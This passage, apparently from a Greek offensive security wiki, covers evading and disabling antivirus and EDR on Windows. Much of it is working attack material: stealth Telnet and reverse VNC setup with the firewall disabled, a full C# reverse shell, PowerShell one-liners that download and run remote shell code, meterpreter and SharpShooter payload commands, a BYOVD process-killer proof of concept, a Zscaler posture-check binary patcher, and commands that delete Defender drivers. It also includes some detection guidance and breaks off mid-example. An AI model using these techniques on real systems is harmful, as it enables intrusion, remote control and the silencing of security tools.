Ένα άλλο εργαλείο που κάνει **το ίδιο είναι το** [**avred**](https://github.com/dobin/avred), το οποίο παρέχει την υπηρεσία μέσω web στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** κατά την εκκίνηση του συστήματος και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Έπειτα, μεταφέρετε το binary _**winvnc.exe**_ και το αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε **μόλις τώρα** μέσα στο **θύμα**

#### **Αντίστροφη σύνδεση**

Ο **attacker** θα πρέπει να **εκτελέσει στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια αντίστροφη **σύνδεση VNC**. Έπειτα, στο **θύμα**: Εκκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε μερικά πράγματα

- Μην εκκινείτε το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινείτε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελείτε το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Το Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση μεταγλωττιστή

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης της Python για την κατασκευή injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Εξόντωση AV/EDR από τον χώρο του kernel

Το Storm-2603 χρησιμοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoints πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον εκμεταλλεύεται για να εκτελεί προνομιακές λειτουργίες kernel, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV με Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένος driver**: Το αρχείο που αποθηκεύεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το «System In-Depth Analysis Toolkit» της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει το driver ως **kernel service** και η δεύτερη το εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από τον χώρο χρήστη.
3. **IOCTLs που εκθέτει το driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός αυθαίρετης διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή αυθαίρετου αρχείου από τον δίσκο |
   | `0x990001D0` | Απεγκατάσταση του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο proof-of-concept σε C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να αλλοιώσει αντικείμενα του kernel, ανεξάρτητα από τις λειτουργίες PPL/PP, ELAM ή άλλες λειτουργίες hardening.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων driver της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ενεργοποιείτε ειδοποίηση όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή δεν υπάρχει στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από user-mode προς προσαρμοσμένα device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector μέσω επιδιόρθωσης δυαδικών αρχείων στον δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (αποστέλλεται μια boolean τιμή στον server).
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με την **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε όλοι οι έλεγχοι θεωρούνται συμμορφωμένοι |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Γίνεται NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμη και χωρίς υπογραφή) μπορεί να συνδεθεί στους RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι posture εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγες τροποποιήσεις byte.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Το πρόγραμμα οδήγησης **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντιπαράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς bug αλλοίωσης μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας χειριστής μπορεί αντίθετα να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασής του και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου Ring-0. Πρόκειται για primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων, και το πρόγραμμα οδήγησης μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου, αντί να εισαχθεί κάποιο εμφανές πρόγραμμα οδήγησης τρίτου κατασκευαστή.<sup>[[36]](#references)</sup>

### Προετοιμασία του προγράμματος οδήγησης μίας χρήσης

Κανονικά, το Defender αποθηκεύει τον πόρο σε ένα αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια υπηρεσία πυρήνα με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, καταγράφει την ανατροφοδότηση και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε να γίνει unload του προγράμματος οδήγησης αντί να παραμείνει φορτωμένο. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με τερματικό null και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) μαζί με δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32, πολυώνυμο `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC μηδενίζεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action ID αποκαλύπτουν αυτές τις primitives του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού μητρώου |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής μητρώου |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής μητρώου και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, ο διαχωριστής κλειδιού/τιμής στο wire είναι **δύο διαδοχικές ανάστροφες κάθετοι**· μια διαδρομή με τη συμβατική μορφοποίηση δεν θα διαχωριστεί σωστά. Το feedback file αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το αντίστοιχο `NTSTATUS`. Για τις ενέργειες 1 και 2, οι οποίες δεν έχουν αρχικό πεδίο flags, το BTR μετακινεί τη διαδρομή στα τέσσερα δεσμευμένα τελικά byte, ώστε να δημιουργήσει χώρο για αυτήν την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας `BTR_CLI` και παράθυρο early-boot

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των streams `<random>.sys:changelist` και feedback, σειριοποίηση/υπολογισμός checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του κλειδιού μητρώου της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για `-trigger boot`. Η απευθείας προετοιμασία του μητρώου παρακάμπτει τη συνήθη διαδρομή `CreateServiceW` του SCM και, επομένως, **δεν** δημιουργεί το συμβάν εγκατάστασης υπηρεσίας Event ID 7045. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί λειτουργίες I/O αρχείων από το `DriverEntry`, πριν να είναι έτοιμα το storage stack και ο σύνδεσμος `SystemRoot`. Το `Start=1`, σε συνδυασμό με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender`, εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά security drivers που ξεκινούν κατά την εκκίνηση και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Φίλτρα που ξεκινούν κατά την εκκίνηση, όπως το `WdFilter`, μπορεί να έχουν ήδη φορτωθεί, αλλά το BTR μπορεί να αφαιρέσει τα δυαδικά αρχεία τους ή τη διαμόρφωση της υπηρεσίας πριν από την επόμενη εκκίνηση, καθώς και να διαγράψει τα εκτελέσιμα αρχεία υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν καλύπτει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση των boot-start και διαθέτει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC τοποθετεί πρώτη την Ενέργεια 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το αρχείο καταγραφής, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την εκφόρτωση. Έτσι περιορίζονται τα στοιχεία, ενώ η τοποθέτηση των feedback στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης με υψηλό σήμα

Οι κανόνες που βασίζονται αποκλειστικά στις υπογραφές και η λίστα αποκλεισμού ευάλωτων driver της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συσχετίσεις συμπεριφοράς, διαχωρίζοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο staging του BTR. Ένα ADS `.dat` που είναι προσαρτημένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender συνήθως αποθηκεύει τα feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την απευθείας δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender`, με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού BTR driver από μη-Defender προέλευση με επακόλουθη διαγραφή αρχείου που αποδίδεται στο `System`/PID 4, ιδιαίτερα όταν πρόκειται για δυαδικά αρχεία ασφαλείας.
- **Sysmon 11 -> 23:** ειδοποιήστε για τη γρήγορη δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αποτελεί επαρκή ένδειξη εμπιστοσύνης, όταν ένας driver εργαλείου ασφαλείας γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για παραποίηση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level, ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να παραποιούν η μία την άλλη. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα δυαδικό αρχείο με ενεργοποιημένο PPL και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε μια καλοήθη λειτουργία (π.χ. logging) σε έναν περιορισμένο μηχανισμό εγγραφής, υποστηριζόμενο από PPL, που λειτουργεί σε προστατευμένους καταλόγους τους οποίους χρησιμοποιούν τα AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελεστεί μια διεργασία ως PPL
- Το EXE-στόχος (και όλες οι φορτωμένες DLL) πρέπει να είναι υπογεγραμμένα με EKU συμβατό με PPL.
- Η διεργασία πρέπει να δημιουργηθεί με το CreateProcess, χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στον signer του δυαδικού αρχείου (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για signer anti-malware, `PROTECTION_LEVEL_WINDOWS` για signer Windows). Η επιλογή εσφαλμένων επιπέδων θα προκαλέσει αποτυχία κατά τη δημιουργία.

Δείτε επίσης εδώ μια ευρύτερη εισαγωγή στα PP/PPL και στην προστασία του LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοικτού κώδικα: CreateProcessAsPPL (επιλέγει επίπεδο προστασίας και προωθεί ορίσματα στο EXE-στόχο):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` ξεκινά τη δική του διεργασία και δέχεται παράμετρο για την εγγραφή αρχείου καταγραφής σε διαδρομή που καθορίζει ο καλών.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή του αρχείου πραγματοποιείται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε τοποθεσίες που συνήθως προστατεύονται.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (σε αφηρημένο επίπεδο)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS`, χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε το όρισμα διαδρομής καταγραφής του ClipUp για να εξαναγκάσετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο AV (π.χ. Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3 αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το αρχείο-στόχο όσο εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL γίνεται πριν το AV κλειδώσει τα αρχεία του, αλλοιώνοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνηση.

Παράδειγμα εκτέλεσης (οι διαδρομές έχουν αφαιρεθεί/συντομευτεί για λόγους ασφαλείας):

```text
